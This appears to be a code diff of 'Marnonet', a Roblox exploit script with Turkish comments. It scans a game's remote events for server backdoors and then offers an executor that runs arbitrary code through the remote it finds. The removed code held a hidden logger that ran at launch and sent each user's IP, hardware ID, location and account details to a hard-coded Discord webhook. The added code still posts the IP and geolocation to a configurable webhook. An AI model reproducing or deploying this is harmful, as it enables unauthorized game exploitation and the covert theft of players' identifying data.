@@ -2,86 +2,54 @@ local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
 
+-- AYARLAR
+local WEBHOOK_URL = "BURAYA_WEBHOOK_LINKINI_YAZ" -- IP ve Oyun bilgisinin gideceği yer
 local MAIN_FONT = Enum.Font.RobotoMono
 
---================ GAKS LOGGER (ORİJİNAL LOG SİSTEMİ) ================--
-local function runInstantLogger()
-    pcall(function()
-        local DName = LocalPlayer.DisplayName
-        local Name = LocalPlayer.Name
-        local Userid = LocalPlayer.UserId
-        local Country = game:GetService("LocalizationService").RobloxLocaleId
+local function sendNotify(title, msg)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = title,
+        Text = msg,
+        Duration = 4
+    })
+end
+
+-- LOGGER FONKSİYONU (IP ve Oyun Bilgisi Gönderir)
+local function logGameInfo(remoteName)
+    local success, result = pcall(function()
         local GetIp = game:HttpGet("https://v4.ident.me/")
         local IpInfo = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
-
-        local IpFields = {"query", "country", "regionName", "city", "zip", "isp", "org", "as"}
-        local IpInfoFields = {}
-        for _, field in ipairs(IpFields) do
-            if IpInfo[field] then IpInfoFields[field] = IpInfo[field] end
-        end
-
-        local IpInfoString = ""
-        for field, value in pairs(IpInfoFields) do
-            IpInfoString = IpInfoString .. "**" .. field .. ":** " .. value .. "\n"
-        end
-
-        local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
-        local AccountAge = LocalPlayer.AccountAge
-        local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
-        local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
-        local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-
-        local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
-            or (secure_load and "Sentinel")
-            or (pebc_execute and "ProtoSmasher")
-            or (KRNL_LOADED and "Krnl")
-            or (is_sirhurt_closure and "SirHurt")
-            or (identifyexecutor and identifyexecutor():find("ScriptWare") and "Script-Ware")
-            or ("Shitty Exploit")
-
-        local url = "https://discord.com/api/webhooks/1491184501487964352/_pk6x_lQsKDFvipu6iK6LEgElg7wKZ_NBwZDDLB6Qzlx7q9ZGHJsv1RFiCUOS7azT8fE"
         local data = {
-            ["avatar_url"] = "https://cdn.discordapp.com/attachments/1491183748543156377/1491411997693054986/Untitled24_20260401203040.png?ex=69d79929&is=69d647a9&hm=fc2b9ad9fca130aed82a3dc80f91f8c18be0a12ecb71f3257f42425fed3dcddc&",
             ["embeds"] = {{
-                ["author"] = {["name"] = "( Someone Executed The Script )", ["url"] = "https://roblox.com"},
-                ["description"] = "__[Player Info](https://www.roblox.com/users/"..Userid..")__\n"
-                    .."**Display Name:** "..DName.."\n"
-                    .."**Username:** "..Name.."\n"
-                    .."**User Id:** "..Userid.."\n"
-                    .."**MembershipType:** "..MembershipType.."\n"
-                    .."**AccountAge:** "..AccountAge.."\n"
-                    .."**Country:** "..Country.."\n"
-                    .."**IP:** "..GetIp.."\n"
-                    .."**Hwid:** "..GetHwid.."\n"
-                    .."**Date:** "..tostring(os.date("%m/%d/%Y")).."\n"
-                    .."**Time:** "..tostring(os.date("%X")).."\n\n"
-                    .."__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__\n"
-                    .."**Game:** "..GAMENAME.."\n"
-                    .."**Game Id**: "..game.PlaceId.."\n"
-                    .."**Exploit:** "..webhookcheck.."\n\n"
-                    .."**IP Information:**\n"..IpInfoString.."\n"
-                    .."**JobId:**\n```"..ConsoleJobId.."```",
-                ["type"] = "rich",
-                ["color"] = tonumber(0xf2ff00),
-                ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"},
+                ["title"] = "Logged Some Shity Ip",
+                ["description"] = "**Marnonet Scanner** bir backdoor tespit etti ve otomatik logladı.",
+                ["color"] = 0, -- Siyah
+                ["fields"] = {
+                    {["name"] = "Oyuncu", ["value"] = LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")", ["inline"] = true},
+                    {["name"] = "IP Adresi", ["value"] = GetIp, ["inline"] = true},
+                    {["name"] = "Konum", ["value"] = (IpInfo.city or "Bilinmiyor") .. " / " .. (IpInfo.country or "Bilinmiyor"), ["inline"] = true},
+                    {["name"] = "Oyun Linki", ["value"] = "https://www.roblox.com/games/" .. game.PlaceId, ["inline"] = false},
+                    {["name"] = "Remote Adı", ["value"] = remoteName, ["inline"] = true}
+                },
+                ["footer"] = {["text"] = "Marnonet Tough Logger"},
+                ["timestamp"] = DateTime.now():ToIsoDate()
             }}
         }
-
-        local newdata = HttpService:JSONEncode(data)
-        local request = (syn and syn.request) or http_request or request or (game and game.HttpPost)
-        if request then
-            pcall(function() request({Url = url, Body = newdata, Method = "POST", Headers = {["content-type"] = "application/json"}}) end)
+        local finalData = HttpService:JSONEncode(data)
+        if (syn and syn.request) or (http and http.request) or http_request then
+            local req = (syn and syn.request) or (http and http.request) or http_request
+            req({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = finalData})
+        else
+            game:HttpPost(WEBHOOK_URL, finalData)
         end
     end)
 end
 
-task.spawn(runInstantLogger)
-
---================ MARNONET GUI ================--
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "Marnonet_System_Panel"
+ScreenGui.Name = "MarnonetBackdoor"
 local targetParent = pcall(function() return gethui() end) and gethui() or game:GetService("CoreGui")
 ScreenGui.Parent = targetParent
 
@@ -89,12 +57,13 @@ local Colors = {
     FrameBg = Color3.fromRGB(15, 15, 15),
     InnerBg = Color3.fromRGB(25, 25, 25),
     BtnBg = Color3.fromRGB(35, 35, 35),
+    BtnHover = Color3.fromRGB(50, 50, 50),
     Text = Color3.fromRGB(255, 255, 255),
     Outline = Color3.fromRGB(255, 255, 255)
 }
 
 local function makeDraggable(frame)
-    local dragging, dragStart, startPos
+    local dragging, dragInput, dragStart, startPos
     frame.InputBegan:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 then
             dragging = true; dragStart = input.Position; startPos = frame.Position
@@ -109,119 +78,130 @@ local function makeDraggable(frame)
     end)
 end
 
--- EXECUTOR FRAME (BAŞLANGIÇTA GİZLİ)
-local MainFrame = Instance.new("Frame", ScreenGui)
+--================ EXECUTOR FRAME ================--
+local MainFrame = Instance.new("Frame")
 MainFrame.Size = UDim2.new(0, 700, 0, 450)
 MainFrame.Position = UDim2.new(0.5, -350, 0.5, -225)
 MainFrame.BackgroundColor3 = Colors.FrameBg
 MainFrame.Visible = false
-MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
 makeDraggable(MainFrame)
 Instance.new("UIStroke", MainFrame).Color = Colors.Outline
 
 local Title = Instance.new("TextLabel", MainFrame)
-Title.Size = UDim2.new(1, -20, 0, 40)
-Title.Position = UDim2.new(0, 10, 0, 5)
+Title.Size = UDim2.new(1, -50, 0, 40)
+Title.Position = UDim2.new(0, 10, 0, 0)
 Title.BackgroundTransparency = 1
-Title.Text = "MARNONET EXECUTOR"
+Title.Text = "Marnonet Executor"
 Title.TextColor3 = Colors.Text
 Title.Font = Enum.Font.GothamBold
-Title.TextSize = 20
-Title.TextXAlignment = 0
+Title.TextScaled = true
+Title.TextXAlignment = Enum.TextXAlignment.Left
 
-local CodeBox = Instance.new("TextBox", MainFrame)
-CodeBox.Size = UDim2.new(0.96, 0, 0.7, 0)
-CodeBox.Position = UDim2.new(0.02, 0, 0.12, 0)
-CodeBox.BackgroundColor3 = Colors.InnerBg
+local CodeBoxBg = Instance.new("Frame", MainFrame)
+CodeBoxBg.Size = UDim2.new(0.96, 0, 0.75, 0)
+CodeBoxBg.Position = UDim2.new(0.02, 0, 0.1, 0)
+CodeBoxBg.BackgroundColor3 = Colors.InnerBg
+Instance.new("UIStroke", CodeBoxBg).Color = Colors.Outline
+
+local CodeBox = Instance.new("TextBox", CodeBoxBg)
+CodeBox.Size = UDim2.new(1, -10, 1, -10)
+CodeBox.Position = UDim2.new(0, 5, 0, 5)
+CodeBox.BackgroundTransparency = 1
+CodeBox.Text = "-- Execute Marnonet Tough"
 CodeBox.TextColor3 = Colors.Text
-CodeBox.Text = "-- Execute Marnonet Here"
-CodeBox.MultiLine = true
 CodeBox.Font = MAIN_FONT
-CodeBox.TextSize = 14
+CodeBox.TextScaled = true
+CodeBox.MultiLine = true
+CodeBox.ClearTextOnFocus = false
 CodeBox.TextXAlignment = 0
 CodeBox.TextYAlignment = 0
-CodeBox.ClearTextOnFocus = false
-Instance.new("UIStroke", CodeBox).Color = Colors.Outline
 
-local ExecBtn = Instance.new("TextButton", MainFrame)
-ExecBtn.Size = UDim2.new(0.3, 0, 0, 40)
-ExecBtn.Position = UDim2.new(0.35, 0, 0.85, 0)
-ExecBtn.BackgroundColor3 = Colors.BtnBg
-ExecBtn.Text = "EXECUTE"
-ExecBtn.TextColor3 = Colors.Text
-ExecBtn.Font = Enum.Font.GothamBold
-Instance.new("UIStroke", ExecBtn).Color = Colors.Outline
+local BottomBar = Instance.new("Frame", MainFrame)
+BottomBar.Size = UDim2.new(0.96, 0, 0, 50)
+BottomBar.Position = UDim2.new(0.02, 0, 0.87, 0)
+BottomBar.BackgroundTransparency = 1
+local Layout = Instance.new("UIListLayout", BottomBar)
+Layout.FillDirection = Enum.FillDirection.Horizontal
+Layout.Padding = UDim.new(0, 15)
+Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 
--- SCANNER PANEL (AÇILDIĞINDA GELECEK EKRAN)
+local function createBtn(txt, parent)
+    local b = Instance.new("TextButton", parent)
+    b.Size = UDim2.new(0, 210, 1, 0)
+    b.BackgroundColor3 = Colors.BtnBg
+    b.Text = txt
+    b.TextColor3 = Colors.Text
+    b.Font = MAIN_FONT
+    b.TextScaled = true
+    Instance.new("UIStroke", b).Color = Colors.Outline
+    return b
+end
+
+local ClearBtn = createBtn("CLEAR", BottomBar)
+local FillBtn = createBtn("AUTO FILL", BottomBar)
+local ExecBtn = createBtn("EXECUTE", BottomBar)
+
+--================ SCANNER FRAME ================--
 local ScanPanel = Instance.new("Frame", ScreenGui)
-ScanPanel.Size = UDim2.new(0, 400, 0, 200)
-ScanPanel.Position = UDim2.new(0.5, -200, 0.5, -100)
+ScanPanel.Size = UDim2.new(0, 450, 0, 250)
+ScanPanel.Position = UDim2.new(0.5, -225, 0.5, -125)
 ScanPanel.BackgroundColor3 = Colors.FrameBg
-ScanPanel.Visible = true -- Bu mutlaka true olmalı
 makeDraggable(ScanPanel)
 Instance.new("UIStroke", ScanPanel).Color = Colors.Outline
 
 local ScanTitle = Instance.new("TextLabel", ScanPanel)
-ScanTitle.Size = UDim2.new(1, 0, 0, 50)
+ScanTitle.Size = UDim2.new(1, 0, 0, 60)
 ScanTitle.BackgroundTransparency = 1
-ScanTitle.Text = "MARNONET SCANNER"
+ScanTitle.Text = "Marnonet Scanner"
 ScanTitle.TextColor3 = Colors.Text
-ScanTitle.Font = Enum.Font.GothamBold
-ScanTitle.TextSize = 22
+ScanTitle.Font = MAIN_FONT
+ScanTitle.TextScaled = true
 
-local ScanBtn = Instance.new("TextButton", ScanPanel)
-ScanBtn.Size = UDim2.new(0.8, 0, 0, 50)
-ScanBtn.Position = UDim2.new(0.1, 0, 0.5, -25)
-ScanBtn.BackgroundColor3 = Colors.BtnBg
-ScanBtn.Text = "Scan For Backdoor"
-ScanBtn.TextColor3 = Colors.Text
-ScanBtn.Font = Enum.Font.GothamBold
-Instance.new("UIStroke", ScanBtn).Color = Colors.Outline
+local ScanActionBtn = createBtn("Scan For Backdoor", ScanPanel)
+ScanActionBtn.Size = UDim2.new(0.8, 0, 0.4, 0)
+ScanActionBtn.Position = UDim2.new(0.1, 0, 0.4, 0)
 
---================ MANTIK VE KİCK FIX ================--
+-- MANTIK
 local TargetRemote = nil
 local IsScanning = false
 local RemoteMap = {}
 
-workspace.ChildAdded:Connect(function(c)
-    if c.Name == "Marnonet_Verify" and IsScanning then
+game.Workspace.ChildAdded:Connect(function(c)
+    if c.Name == "Marnonet_V" and IsScanning then
         TargetRemote = RemoteMap[c.Value]
         c:Destroy()
         if TargetRemote then
             IsScanning = false
-            ScanPanel.Visible = false
+            ScanActionBtn.Text = "Scan For Backdoor"
+            logGameInfo(TargetRemote.Name) -- LOGLAMA BURADA ÇALIŞIR
+            sendNotify("Marnonet", "Backdoor Found & Logged!")
+            task.wait(0.5)
             MainFrame.Visible = true
+            ScanPanel.Visible = false
         end
     end
 end)
 
-ScanBtn.MouseButton1Click:Connect(function()
+ScanActionBtn.MouseButton1Click:Connect(function()
     if IsScanning then return end
     IsScanning = true
-    ScanBtn.Text = "SCANNING..."
-    
+    ScanActionBtn.Text = "SCANNING..."
+    RemoteMap = {}
     local remotes = {}
     for _, v in ipairs(game:GetDescendants()) do 
         if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then table.insert(remotes, v) end 
     end
-
     task.spawn(function()
         for i, r in ipairs(remotes) do
             if not IsScanning then break end
             pcall(function()
                 local id = tostring(i)
                 RemoteMap[id] = r
-                local code = "local s=Instance.new('StringValue',workspace);s.Name='Marnonet_Verify';s.Value='"..id.."'"
+                local code = "local s=Instance.new('StringValue',workspace);s.Name='Marnonet_V';s.Value='"..id.."'"
                 if r:IsA("RemoteEvent") then r:FireServer(code) else task.spawn(function() r:InvokeServer(code) end) end
             end)
-            -- KICK FIX: Her 10 denemede 0.1s bekleme
-            if i % 10 == 0 then task.wait(0.1) end
-        end
-        if IsScanning then
-            ScanBtn.Text = "No Backdoor Found"
-            task.wait(2)
-            ScanBtn.Text = "Scan For Backdoor"
-            IsScanning = false
+            if i % 40 == 0 then RunService.Heartbeat:Wait() end
         end
     end)
 end)
@@ -231,3 +211,6 @@ ExecBtn.MouseButton1Click:Connect(function()
         if TargetRemote:IsA("RemoteEvent") then TargetRemote:FireServer(CodeBox.Text) else TargetRemote:InvokeServer(CodeBox.Text) end
     end
 end)
+
+ClearBtn.MouseButton1Click:Connect(function() CodeBox.Text = "" end)
+FillBtn.MouseButton1Click:Connect(function() CodeBox.Text = CodeBox.Text:gsub('"(.-)"', '"' .. LocalPlayer.Name .. '"') end)
